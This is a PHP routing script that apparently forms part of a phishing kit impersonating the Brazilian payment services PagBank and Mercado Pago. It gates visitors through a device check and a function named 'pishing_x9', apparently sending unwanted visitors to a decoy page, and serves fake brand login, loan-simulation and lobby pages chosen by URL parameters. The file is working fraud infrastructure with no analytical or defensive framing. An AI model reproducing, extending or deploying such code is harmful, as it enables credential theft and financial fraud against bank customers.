<?php
require_once('../webdriver/conexao.php');
require_once('../webdriver/function.php');
verificar_dispositivo_2();

if (!isset($_SESSION['device_unlock'])) :
    pishing_x9('../webdriver/paginas/x9.php');
    exit();
endif;
$pages = [
    'pagban_simulacao' => [
        'proposta' => '../webdriver/paginas/pagbank_proposta.php',
        'simulacao' => '../webdriver/paginas/pagbank_simulacao.php',
        'lobby' => '../webdriver/paginas/pagbank_lobby.php',
        'login' => '../webdriver/paginas/pagbank_login.php'
    ],
    'pagbank' => [
        'acesso' => '../webdriver/paginas/pagbank.php',
        'login' => '../webdriver/paginas/pagbank_index.php'
    ],
        'mercadopago' => [
        'login' => '../webdriver/paginas/mercadopago.php',
    ],
];

if (isset($_GET['app'], $_GET['acao']) && isset($pages[$_GET['app']][$_GET['acao']])) {
    $pagina_login = $pages[$_GET['app']][$_GET['acao']];
    pagina($pagina_login);
}
